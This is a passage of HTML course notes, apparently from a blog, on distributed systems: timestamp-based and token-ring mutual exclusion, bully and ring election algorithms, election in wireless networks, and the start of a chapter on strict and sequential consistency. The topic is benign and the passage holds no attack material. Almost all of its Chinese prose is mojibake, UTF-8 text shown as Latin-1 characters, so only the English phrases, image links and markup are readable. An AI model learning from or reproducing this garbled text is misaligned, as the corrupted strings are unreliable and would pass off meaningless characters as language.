<li><p>è‹¥Bå·²ç»åœ¨ç”¨è¿™ä¸ªèµ„æºäº†ï¼Œå°±ä¸ç†Aï¼Œä½†æ˜¯æŠŠAçš„è¯·æ±‚æ¶ˆæ¯æ”¾è¿›ç­‰å¾…é˜Ÿåˆ—ä¸­ã€‚</p>
<p>â€œSorry, I am using it. I will save your request, and give you an OK when I am done with it.â€</p>
</li>
<li><p>è‹¥Bä¹Ÿæƒ³ç”¨è¿™ä¸ªèµ„æºï¼Œä½†æ˜¯è¿˜æ²¡å¼€å§‹ç”¨ï¼Œé‚£ä¹ˆå°±æŠŠAå‘é€æ¥çš„æ¶ˆæ¯æ—¶é—´æˆ³å’Œè‡ªå·±å°†è¦å¹¿æ’­æ¶ˆæ¯çš„æ—¶é—´æˆ³è¿›è¡Œæ¯”è¾ƒï¼Œè°å‘çš„æ—©è°è·å¾—èµ„æºã€‚<strong>è¿™é‡Œçš„ä¸€è‡´æ€§æ˜¯ç”±Lamporté€»è¾‘æ—¶é’Ÿä¿è¯çš„ã€‚</strong></p>
<p>ç«äº‰å¤±è´¥çš„è¿›ç¨‹ä¼šç»™è·å¾—èµ„æºçš„è¿›ç¨‹å‘ä¸ªOKï¼Œç„¶åæŠŠè‡ªå·±æ”¾è¿›ç­‰å¾…é˜Ÿåˆ—é‡Œã€‚</p>
<ul>
<li><p>If the incoming message has a lower timestamp, <strong>the receiver sends back an OK.</strong></p>
<p>â€œI want it also, but you were first.â€</p>
</li>
<li><p>If itâ€™s own message has a lower timestamp, <strong>it queues it up.</strong></p>
<p>â€œSorry, I want it also, and I was first.â€</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451796.png" alt="image-20190418214710376"></p>
<h3 id="ä»¤ç‰Œç¯ç®—æ³•-A-Token-Ring-Algorithm"><a href="#ä»¤ç‰Œç¯ç®—æ³•-A-Token-Ring-Algorithm" class="headerlink" title="ä»¤ç‰Œç¯ç®—æ³• - A Token Ring Algorithm"></a>ä»¤ç‰Œç¯ç®—æ³• - A Token Ring Algorithm</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451797.png" alt="image-20190418220302174"></p>
<p>åœ¨ç½‘ç»œä¸­ï¼Œç¯çš„é¡ºåºæ˜¯æ— åºçš„ï¼Œä½†æ˜¯å¯ä»¥ç”¨è½¯ä»¶çš„æ–¹æ³•æ„é€ æˆä¸€ä¸ªæœ‰åºçš„é€»è¾‘ç¯ã€‚ç¯çš„é¡ºåºå’Œè¿›ç¨‹åœ¨æ€»çº¿ä¸Šçš„ä½ç½®æ˜¯æ— å…³çš„ã€‚</p>
<p>ä»¤ç‰Œ(token)åœ¨è¿›ç¨‹é—´ç›¸äº’ä¼ é€’ï¼Œæ‹¥æœ‰ä»¤ç‰Œçš„è¿›ç¨‹å¯ä»¥è®¿é—®å…±äº«èµ„æºï¼Œç”¨å®Œå°±å‘ä¸‹ä¼ ã€‚</p>
<p>å¦‚æœæŸä¸ªè¿›ç¨‹æ”¶åˆ°äº†ä»¤ç‰Œä½†ä¸ç”¨è®¿é—®èµ„æºå°±ä¼ ä¸‹å»ã€‚</p>
<p><strong>ä¸å…è®¸æŸä¸€ä¸ªè¿›ç¨‹ç”¨å®Œèµ„æºåï¼Œä½¿ç”¨åŒä¸€ä»¤ç‰Œç»§ç»­è®¿é—®è¯¥èµ„æºã€‚</strong></p>
<p><strong>æ•´ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸­åªæœ‰ä¸€ä¸ªä»¤ç‰Œ</strong>ï¼Œå¦‚æœä»¤ç‰Œæ¯äº†ï¼Œæ¯”å¦‚æ‹¥æœ‰ä»¤ç‰Œçš„è¿›ç¨‹æŒ‚æ‰äº†ï¼Œé‚£ä¹ˆå°±éœ€è¦é‡å¯ä¸€ä¸ªå¤æ‚çš„åˆ†å¸ƒå¼è¿›ç¨‹åˆ›å»ºæ–°ä»¤ç‰Œã€‚</p>
<h3 id="å››ç§ç®—æ³•çš„æ¯”è¾ƒ"><a href="#å››ç§ç®—æ³•çš„æ¯”è¾ƒ" class="headerlink" title="å››ç§ç®—æ³•çš„æ¯”è¾ƒ"></a>å››ç§ç®—æ³•çš„æ¯”è¾ƒ</h3><p>å››ç§äº’æ–¥ç®—æ³•æ¯æ¬¡è¿›&#x2F;å‡ºéœ€è¦çš„æ¶ˆæ¯æ•°ä»¥åŠè¿›å…¥å‰çš„å»¶è¿Ÿ(æŒ‰æ¶ˆæ¯æ•°)</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451798.png" alt="image-20190421215739105"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451799.png" alt="image-20190421215840729"></p>
<h2 id="é€‰ä¸¾ç®—æ³•-Election-Algorithms"><a href="#é€‰ä¸¾ç®—æ³•-Election-Algorithms" class="headerlink" title="é€‰ä¸¾ç®—æ³• - Election Algorithms"></a>é€‰ä¸¾ç®—æ³• - Election Algorithms</h2><p>å¾ˆå¤šåˆ†å¸ƒå¼çš„æœºå­ï¼Œè¦é€‰ä¸¾å‡ºä¸€ä¸ªåè°ƒè€…ã€‚</p>
<p>æˆ–è€…åè°ƒè€…å´©äº†ï¼Œè¦é‡é€‰ä¸€ä¸ªåè°ƒè€…ã€‚</p>
<p><strong>é€‰ä¸¾ç®—æ³•å°±æ˜¯é€‰ä¸€ä¸ªåè°ƒè€…çš„ç®—æ³•ã€‚</strong></p>
<h3 id="æ¬ºè´Ÿç®—æ³•-Bully-Algorithm"><a href="#æ¬ºè´Ÿç®—æ³•-Bully-Algorithm" class="headerlink" title="æ¬ºè´Ÿç®—æ³• - Bully Algorithm"></a>æ¬ºè´Ÿç®—æ³• - Bully Algorithm</h3><p>å½“ä»»ä½•ä¸€ä¸ªè¿›ç¨‹å‘ç°åè°ƒè€…ä¸å†å“åº”è¯·æ±‚æ—¶ï¼Œå®ƒå°±å‘èµ·ä¸€æ¬¡é€‰ä¸¾</p>
<ol>
<li>På‘æ‰€æœ‰ç¼–å·æ¯”å®ƒå¤§çš„è¿›ç¨‹å‘é€ä¸€ä¸ªELECTIONæ¶ˆæ¯</li>
<li>å¦‚æœæ— äººå“åº”ï¼ŒPè·èƒœå¹¶ç§°ä¸ºåè°ƒè€…</li>
<li>å¦‚æœæœ‰ç¼–å·æ¯”å®ƒå¤§çš„è¿›ç¨‹å“åº”ï¼Œåˆ™ç”±å“åº”è€…æ¥ç®¡é€‰ä¸¾å·¥ä½œã€‚Pçš„å·¥ä½œå®Œæˆã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451800.png" alt="image-20190418222917752"></p>
<p>å½“æœ‰ELECTIONæ¶ˆæ¯åˆ°è¾¾æ—¶ï¼Œæ¥æ”¶è€…å›é€ä¸€ä¸ªOKæ¶ˆæ¯ç»™å‘é€è€…ï¼Œè¡¨æ˜è‡ªå·±ä»åœ¨è¿è¡Œï¼Œå¹¶æ¥ç®¡é€‰ä¸¾å·¥ä½œã€‚æœ€ç»ˆé™¤äº†ä¸€ä¸ªè¿›ç¨‹å¤–ï¼Œå…¶ä»–è¿›ç¨‹éƒ½å°†æ”¾å¼ƒï¼Œè¿™ä¸ªè¿›ç¨‹å°±æ˜¯æ–°çš„åè°ƒè€…ã€‚å®ƒå°†è·èƒœçš„æ¶ˆæ¯å‘é€ç»™æ‰€æœ‰è¿›ç¨‹ã€‚</p>
<p>å½“ä»¥å‰çš„ä¸€ä¸ªå´©æºƒäº†çš„è¿›ç¨‹æ¢å¤è¿‡æ¥æ—¶ï¼Œå®ƒå°†ä¸»æŒä¸€æ¬¡é€‰ä¸¾ã€‚</p>
<p><strong>æ€»ç»“ä¸€ä¸‹ï¼š</strong></p>
<p>è¿™ä¸ªç®—æ³•å°±æ˜¯å“ªä¸ªè¿›ç¨‹çš„ç¼–å·å¤§ä¸”æ²¡å´©ç›˜å“ªä¸ªå°±æ˜¯åè°ƒè€…ï¼Œå› ä¸ºç¼–å·å°çš„éƒ½è¦é—®ç¼–å·å¤§çš„ï¼Œç¼–å·å¤§çš„åªè¦æ²¡å´©éƒ½è¯´æ¥ç®¡é€‰ä¸¾ä»»åŠ¡ã€‚è€Œä¸”å´©ç›˜çš„è¿›ç¨‹ä¸€æ—¦æ¢å¤äº†ï¼Œå°±ä¼šå¹¿æ’­ä¸€ä¸ªCOORDINATORæ¶ˆæ¯ï¼Œè¡¨ç¤ºå¤§å“¥å›æ¥äº†ï¼Œåˆæ¥ç®¡åè°ƒè€…çš„ä»»åŠ¡ã€‚</p>
<h3 id="ç¯ç®—æ³•-Election-in-a-Ring"><a href="#ç¯ç®—æ³•-Election-in-a-Ring" class="headerlink" title="ç¯ç®—æ³• - Election in a Ring"></a>ç¯ç®—æ³• - Election in a Ring</h3><p>ä¼šæœ‰2ä¸ªæ¶ˆæ¯ï¼Œå„ç»•ç¯ä¸€åœˆã€‚</p>
<p><strong>step 1 å‘é€ELECTION messageï¼š</strong></p>
<p>å½“ä»»ä½•ä¸€ä¸ªè¿›ç¨‹å‘ç°åè°ƒè€…ä¸å·¥ä½œæ—¶ï¼Œ<strong>å®ƒå°±æ„é€ ä¸€ä¸ªå¸¦æœ‰å®ƒè‡ªå·±è¿›ç¨‹å·çš„ELECTIONæ¶ˆæ¯</strong>ï¼Œå‘é€ç»™åç»§è€…ã€‚å¦‚æœåç»§è€…å´©æºƒï¼Œå°±è·³è¿‡å´©æºƒçš„è¿›ç¨‹ï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚æ¯ä¸€æ­¥ï¼Œå‘é€è€…éƒ½å°†è‡ªå·±çš„è¿›ç¨‹å·åŠ å…¥åˆ°æ¶ˆæ¯ä¸­ï¼Œä½¿è‡ªå·±ä¹Ÿæˆä¸ºåè°ƒè€…çš„å€™é€‰äººã€‚</p>
<p>æœ€ç»ˆæ¶ˆæ¯è¿”å›åˆ°å‘èµ·é€‰ä¸¾çš„è¿›ç¨‹ã€‚å½“å‘èµ·è€…æ¥æ”¶åˆ°åŒ…å«è‡ªå·±å·çš„æ¶ˆæ¯ï¼Œè¯†åˆ«å‡ºè¿™ä¸ªäº‹ä»¶ï¼Œ<strong>é€‰å‡ºè¿›ç¨‹å·æœ€å¤§çš„ä½œä¸ºåè°ƒè€…</strong>ã€‚</p>
<p><strong>step 2 å‘é€COORDINATOR messageï¼š</strong></p>
<p>ç¬¬ä¸€åˆ™çš„æ¶ˆæ¯è½¬å˜ä¸ºCOORDINATORï¼Œå¹¶å†ä¸€æ¬¡ç»•ç¯è¿è¡Œï¼Œ<strong>é€šçŸ¥å¤§å®¶è°æ˜¯æ–°çš„åè°ƒè€…ä»¥åŠæ–°ç¯ä¸­çš„æˆå‘˜</strong>ã€‚æ¶ˆæ¯å¾ªç¯ä¸€å‘¨åè¢«åˆ é™¤ï¼Œç„¶åæ¯ä¸ªè¿›ç¨‹æ¢å¤æ­£å¸¸å·¥ä½œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451801.png" alt="image-20190418224020806"></p>
<p>è¿™ä¸ªå›¾æ˜¯è¯´å½“è¿›ç¨‹2å’Œ5åŒæ—¶å‘ç°åè°ƒè€…7å´©ç›˜äº†ï¼Œä½¿ç”¨ç¯é€‰ä¸¾ç®—æ³•é€‰å‡ºæ–°çš„åè°ƒè€…ã€‚</p>
<p>è¿™ä¸ªå›¾åœ¨æ¼”ç¤ºElection messageæ˜¯æ€ä¹ˆå¾ªç¯çš„ï¼Œç°åœ¨è¿˜æ²¡æœ‰4åˆ°5çš„ç®­å¤´ï¼Œæ˜¯å› ä¸ºè¿˜æ²¡å¾ªç¯åˆ°é‚£é‡Œã€‚</p>
<h3 id="æ— çº¿ç³»ç»Ÿä¸‹çš„é€‰ä¸¾ç®—æ³•"><a href="#æ— çº¿ç³»ç»Ÿä¸‹çš„é€‰ä¸¾ç®—æ³•" class="headerlink" title="æ— çº¿ç³»ç»Ÿä¸‹çš„é€‰ä¸¾ç®—æ³•"></a>æ— çº¿ç³»ç»Ÿä¸‹çš„é€‰ä¸¾ç®—æ³•</h3><p>é€‰å®šä¸€ä¸ªæºèŠ‚ç‚¹ï¼Œåœ¨ç½‘ç»œæ‹“æ‰‘ç»“æ„ä¸­æ„é€ æ ‘å½¢ç»“æ„ï¼ŒæºèŠ‚ç‚¹å°±æ˜¯æ ‘çš„æ ¹ç»“ç‚¹ã€‚</p>
<p>ä¾‹ï¼š</p>
<ol>
<li>é€‰å®šaæ˜¯æºèŠ‚ç‚¹ï¼›</li>
<li>aå‘ç›¸é‚»ç»“ç‚¹(bå’Œc)å‘ç”ŸELECTIONæ¶ˆæ¯ï¼›</li>
<li>bå’Œcç¬¬ä¸€æ¬¡æ¥å—åˆ°ELECTIONæ¶ˆæ¯ï¼Œè®¤ä¸ºaæ˜¯ä»–ä»¬çš„çˆ¶ç»“ç‚¹ï¼›</li>
<li>bå’Œcå†æ¬¡å‘ç›¸é‚»ç»“ç‚¹å‘é€ELECTIONæ¶ˆæ¯ï¼Œæ­¤æ—¶gç»“ç‚¹ä¸€å®šéƒ½ä¼šå—åˆ°bå’Œcçš„ELECTIONæ¶ˆæ¯ï¼Œè°çš„æ¶ˆæ¯å…ˆåˆ°è°å°±æ˜¯gçš„çˆ¶ç»“ç‚¹ï¼›</li>
<li>å¦‚æ­¤é€’ç»™æ„é€ æ ‘å½¢ç»“æ„ï¼Œç›´åˆ°å¶èŠ‚ç‚¹ï¼›</li>
<li>ä»å¶èŠ‚ç‚¹å¼€å§‹ï¼Œé€å±‚å‘ä¸Šå‘é€è‡ªèº«æƒ…å†µï¼Œæ¯ä¸ªéå¶å­èŠ‚ç‚¹æ”¶åˆ°å­èŠ‚ç‚¹æƒ…å†µæ±‡æŠ¥åï¼Œä¼šå°†å­ç»“ç‚¹æƒ…å†µä¸è‡ªèº«æƒ…å†µç›¸æ¯”è¾ƒï¼Œé€‰æ‹©å‡ºæœ€ä¼˜ç»“ç‚¹ï¼Œå†å‘ä¸Šæ±‡æŠ¥ã€‚è¿™æ ·æ ¹ç»“ç‚¹(æºèŠ‚ç‚¹)å°±çŸ¥é“å“ªä¸ªç»“ç‚¹æ˜¯æœ€ä¼˜çš„ã€‚ä»è€Œé€‰å‡ºè¿™ä¸ªç»“ç‚¹æ˜¯åè°ƒè€…ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451802.png" alt="image-20190419105744830"></p>
<p><strong>æ€»ç»“ï¼š</strong></p>
<ol>
<li>çˆ¶ç»“ç‚¹å‘å­èŠ‚ç‚¹å¹¿æ’­ELECTIONæ¶ˆæ¯ï¼Œç›´åˆ°æœ€åº•å±‚ã€‚</li>
<li>ä»æœ€åº•å±‚å¼€å§‹æ¯ä¸ªç»“ç‚¹å‘çˆ¶ç»“ç‚¹æŠ¥å‘Šè‡ªå·±çš„å®¹é‡å’ŒèŠ‚ç‚¹å·ï¼Œåˆçˆ¶ç»“ç‚¹é€‰æ‹©å®¹é‡å¤§çš„ä½œä¸ºæœ€ä½³ç»“ç‚¹ï¼Œç»§ç»­å†å‘è‡ªå·±çš„çˆ¶ç»“ç‚¹æŠ¥å‘Šã€‚æœ€ç»ˆåˆ°æ ¹èŠ‚ç‚¹é€‰å‡ºä¸€ä¸ªå®¹é‡æœ€å¤§çš„æœ€ä½³ç»“ç‚¹ã€‚</li>
</ol>
<hr>
<h1 id="Chpater-7-ä¸€è‡´æ€§å’Œå¤åˆ¶-Consistency-amp-Replication"><a href="#Chpater-7-ä¸€è‡´æ€§å’Œå¤åˆ¶-Consistency-amp-Replication" class="headerlink" title="Chpater 7 ä¸€è‡´æ€§å’Œå¤åˆ¶ - Consistency &amp; Replication"></a>Chpater 7 ä¸€è‡´æ€§å’Œå¤åˆ¶ - Consistency &amp; Replication</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><h3 id="ä¸ºä»€ä¹ˆè¦è¿›è¡Œæ•°æ®çš„å¤åˆ¶ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦è¿›è¡Œæ•°æ®çš„å¤åˆ¶ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦è¿›è¡Œæ•°æ®çš„å¤åˆ¶ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦è¿›è¡Œæ•°æ®çš„å¤åˆ¶ï¼Ÿ</h3><p>è¿›è¡Œå¤åˆ¶æ˜¯ä¸ºäº†å¢å¼ºç³»ç»Ÿçš„<strong>å¯é æ€§</strong>å’Œ<strong>æ€§èƒ½</strong>ã€‚</p>
<ul>
<li>å¯é æ€§ï¼šæ›´å¥½çš„é˜²æ­¢æ•°æ®è¢«ç ´åã€‚</li>
<li>æ€§èƒ½ï¼šå½“åˆ†å¸ƒå¼ç³»ç»Ÿéœ€è¦åœ¨æœåŠ¡å™¨æ•°é‡å’Œåœ°ç†åŒºåŸŸä¸Šè¿›è¡Œæ‰©å±•æ—¶ï¼Œå°±éœ€è¦å¤åˆ¶æ¥æé«˜æ€§èƒ½ã€‚</li>
</ul>
<h3 id="å¤åˆ¶å¸¦æ¥çš„é—®é¢˜-ï¼Ÿ"><a href="#å¤åˆ¶å¸¦æ¥çš„é—®é¢˜-ï¼Ÿ" class="headerlink" title="å¤åˆ¶å¸¦æ¥çš„é—®é¢˜ ï¼Ÿ"></a>å¤åˆ¶å¸¦æ¥çš„é—®é¢˜ ï¼Ÿ</h3><p>ä¸€è‡´æ€§é—®é¢˜</p>
<h3 id="ä¸¤ä¸ªæœ¯è¯­ğ‘Šğ‘–-ğ‘¥-ğ‘å’Œğ‘…ğ‘–-ğ‘¥-ğ‘"><a href="#ä¸¤ä¸ªæœ¯è¯­ğ‘Šğ‘–-ğ‘¥-ğ‘å’Œğ‘…ğ‘–-ğ‘¥-ğ‘" class="headerlink" title="ä¸¤ä¸ªæœ¯è¯­ğ‘Šğ‘–(ğ‘¥)ğ‘å’Œğ‘…ğ‘–(ğ‘¥)ğ‘"></a>ä¸¤ä¸ªæœ¯è¯­ğ‘Šğ‘–(ğ‘¥)ğ‘å’Œğ‘…ğ‘–(ğ‘¥)ğ‘</h3><ul>
<li>ğ‘Šğ‘–(ğ‘¥)ğ‘: è¿›ç¨‹ğ‘ƒğ‘–æŠŠæ•°å€¼aå†™å…¥åˆ°æ•°æ®é¡¹xã€‚</li>
<li>ğ‘…ğ‘–(ğ‘¥)ğ‘: è¿›ç¨‹ğ‘ƒğ‘–ä»æ•°æ®é¡¹xè¯»å–æ•°æ®åè¿”å›æ•°å€¼bã€‚</li>
</ul>
<h3 id="ä¸¥æ ¼ä¸€è‡´æ€§"><a href="#ä¸¥æ ¼ä¸€è‡´æ€§" class="headerlink" title="ä¸¥æ ¼ä¸€è‡´æ€§"></a>ä¸¥æ ¼ä¸€è‡´æ€§</h3><p><strong>å°±æ˜¯å†™æ“ä½œå¿…é¡»åœ¨è¯»æ“ä½œçš„å‰é¢æ‰§è¡Œ</strong></p>
<p><strong>å®šä¹‰:</strong></p>
<p>åœ¨ä¸€ä¸ªå‰¯æœ¬ä¸Šæ‰§è¡Œæ›´æ–°æ“ä½œæ—¶ï¼Œæ— è®ºè¿™ä¸€æ“ä½œæ˜¯åœ¨å“ªä¸ªå‰¯æœ¬ä¸Šå¯åŠ¨æˆ–æ‰§è¡Œçš„ï¼Œè¿™ä¸€æ›´æ–°æ“ä½œéƒ½åº”è¯¥åœ¨ååºæ“ä½œå‘ç”Ÿå‰ä¼ æ’­åˆ°æ‰€æœ‰å‰¯æœ¬ã€‚</p>
<p>ä»è¿™ä¸ªå®šä¹‰é‡Œå¯ä»¥å‘ç°ï¼š</p>
<ul>
<li>éšå«çš„å‡è®¾å­˜åœ¨ç»å¯¹çš„å…¨å±€æ—¶é—´ã€‚</li>
<li>åœ¨å•å¤„ç†å™¨ä¸­(æˆ–è€…åœ¨æœ‰å•ä¸€æ§åˆ¶æ€»çº¿ç¯å¢ƒä¸‹-&gt;å•ä¸€æ—¶é’Ÿ)å¯ä»¥å®ç°ï¼Œåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­<strong>ä¸å¯èƒ½</strong>å®ç°ã€‚</li>
</ul>
<p><strong>ä¾‹:</strong> ä¸‹å›¾ä¸­ï¼Œ(a)æ˜¯å…·æœ‰ä¸¥æ ¼ä¸€è‡´æ€§çš„ï¼Œ(b)æ˜¯æ²¡æœ‰çš„ï¼Œå› ä¸ºP2å‡ºç°äº†R(x)NILï¼ŒP1çš„å†™æ“ä½œæ²¡æœ‰åœ¨P2çš„è¯»æ“ä½œä¹‹å‰ä¼ æ’­è¿‡æ¥ã€‚ (è¿™æ ¹çº¿çš„æ„æ€å°±æ˜¯âŒï¼Œè¡¨ç¤ºè¿™ä¸ªå›¾ä¸æ»¡è¶³è¦æ±‚)</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451803.png" alt="image-20190419143114051"></p>
<h2 id="ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹"><a href="#ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹" class="headerlink" title="ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹"></a>ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹</h2><p><strong>è¦æ±‚çŸ¥é“å®šä¹‰ï¼Œèƒ½åˆ¤æ–­ï¼</strong></p>
<h3 id="æŒç»­ä¸€è‡´æ€§"><a href="#æŒç»­ä¸€è‡´æ€§" class="headerlink" title="æŒç»­ä¸€è‡´æ€§"></a>æŒç»­ä¸€è‡´æ€§</h3><p>è¿™å—è€å¸ˆå¤§æ¦‚æäº†ä¸€ä¸‹ï¼Œå¤§æ¦‚æ„æ€æ˜¯ä»€ä¹ˆæ˜¯ä¸€è‡´ï¼Œæ€ä¹ˆåˆ¤æ–­ä¸€è‡´ï¼Œä»¥ä¸€ä¸ªä»€ä¹ˆæ ·çš„æ ‡å‡†æ¥åˆ¤æ–­ä¸€è‡´ã€‚</p>
<h3 id="ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹å’Œä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹çš„åŒºåˆ«"><a href="#ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹å’Œä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹çš„åŒºåˆ«" class="headerlink" title="ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹å’Œä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹çš„åŒºåˆ«"></a>ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹å’Œä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹çš„åŒºåˆ«</h3><h4 id="ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹-1"><a href="#ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹-1" class="headerlink" title="ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹"></a>ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹</h4><p>ä¸åŒºåˆ†å®¢æˆ·ï¼Œæ‰€ä»¥å«ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹ã€‚</p>
<ol>
<li><strong>é’ˆå¯¹æ‰€æœ‰çš„ç”¨æˆ·ï¼Œæ˜¯æ²¡æœ‰åŒºåˆ«çš„ã€‚æ‰€æœ‰ç”¨æˆ·çœ‹åˆ°çš„éƒ½æ˜¯åŒæ ·çš„ä¸œè¥¿ã€‚å¯¹æ‰€æœ‰çš„ç”¨æˆ·ä¸€è§†åŒä»ã€‚</strong></li>
<li>ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹ï¼Œä»å¤§çš„èŒƒå›´æ¥çœ‹ï¼Œ<strong>éƒ½æ˜¯æ¯”è¾ƒä¸¥æ ¼çš„ä¸€è‡´æ€§æ¨¡å‹ã€‚</strong></li>
<li><strong>æˆæœ¬æ¯”è¾ƒé«˜ã€‚</strong></li>
<li>å¸¸å¸¸ç”¨åœ¨å¤§å‹çš„æ•°æ®ä¸­å¿ƒä¸­ï¼Œç³»ç»Ÿä¸€èˆ¬æ¥è®²ä¸æ˜¯å¾ˆå¤§ï¼Œ<strong>ä»¥å±€åŸŸç½‘ä¸ºä¸»ã€‚</strong></li>
</ol>
<h4 id="ä»¥ç”¨æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹"><a href="#ä»¥ç”¨æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹" class="headerlink" title="ä»¥ç”¨æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹"></a>ä»¥ç”¨æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹</h4><ol>
<li><strong>ç”¨æˆ·ä¸åŒï¼Œçœ‹åˆ°çš„ç»“æœå¯èƒ½ä¸ä¸€æ ·ã€‚</strong></li>
<li>ä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹ï¼Œ<strong>éƒ½æ˜¯æ¯”è¾ƒå¼±çš„ä¸€è‡´æ€§ã€‚</strong></li>
<li>å› ä¸ºæ˜¯é’ˆå¯¹æŸä¸€ä¸ªå®¢æˆ·çš„éœ€æ±‚æ¥ä¿æŒä¸€è‡´ã€‚<strong>ç›¸å¯¹æ¥è¯´æˆæœ¬æ¯”è¾ƒä½ã€‚</strong></li>
<li>èŒƒå›´å¹¿ï¼Œç”šè‡³å¯ä»¥åœ¨Internetä¸Šä½¿ç”¨ï¼Œç›¸å¯¹æ¥è¯´æ˜¯åœ¨ä¸€ä¸ªå¹¿åŸŸç½‘ä¸Šï¼Œ<strong>ä¸€èˆ¬ç”¨åœ¨ä¼ä¸šåº”ç”¨ä¸Šã€‚</strong></li>
</ol>
<p><strong>åé¢çš„ä¸€ç³»åˆ—æ¨¡å‹ï¼Œå°±æ˜¯åœ¨å¯¹ä¸¥æ ¼ä¸€è‡´æ€§çš„æ¡ä»¶è¿›è¡Œæ”¾æ¾ï¼Œåœ¨ä¸€ä¸ªåŒæ–¹éƒ½å¯ä»¥æ¥å—çš„çº¦æŸï¼Œè®¤ä¸ºå®ƒæ˜¯ä¸€è‡´çš„ (ç±»ä¼¼äºçä¸€åªçœ¼é—­ä¸€åªçœ¼)</strong></p>
<h3 id="é¡ºåºä¸€è‡´æ€§"><a href="#é¡ºåºä¸€è‡´æ€§" class="headerlink" title="é¡ºåºä¸€è‡´æ€§"></a>é¡ºåºä¸€è‡´æ€§</h3><p><strong>å®šä¹‰</strong></p>
<p>æ•°æ®å­˜å‚¨æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ—¶ï¼Œç§°ä¸ºæ˜¯é¡ºåºä¸€è‡´çš„ã€‚</p>
<blockquote>
<p>ä»»ä½•è¿›ç¨‹çš„æ‰§è¡Œç»“æœéƒ½æ˜¯ç›¸åŒçš„ï¼Œå°±å¥½åƒæ‰€æœ‰è¿›ç¨‹å¯¹æ•°æ®å­˜å‚¨çš„è¯»ã€å†™æ“ä½œæ˜¯<strong>æŒ‰æŸç§åºåˆ—é¡ºåº</strong>æ‰§è¡Œçš„ï¼Œå¹¶ä¸”æ¯ä¸ªè¿›ç¨‹çš„æ“ä½œæŒ‰ç…§ç¨‹åºæ‰€åˆ¶å®šçš„é¡ºåºå‡ºç°åœ¨è¿™ä¸ªåºåˆ—ä¸­ã€‚</p>
</blockquote>
<p><strong>å’Œä¸¥æ ¼ä¸€è‡´ä¸åŒä¹‹å¤„</strong></p>
<p>ä¸å†è¦æ±‚å†™å¿…é¡»åœ¨è¯»çš„å‰é¢ã€‚</p>
<p><strong>æ€æƒ³</strong></p>
<p>å…è®¸ç”±äºç§ç§å› ç´ å‡ºé”™ï¼Œä½†æ˜¯å‡ºçš„é”™å¾—æ˜¯ä¸€æ ·çš„ï¼Œæ‰€æœ‰äººæœ€åç»“æœç›¸åŒå°±è¡Œã€‚</p>
<p><strong>ä¾‹ï¼š</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451804.png" alt="image-20190419151031060"></p>
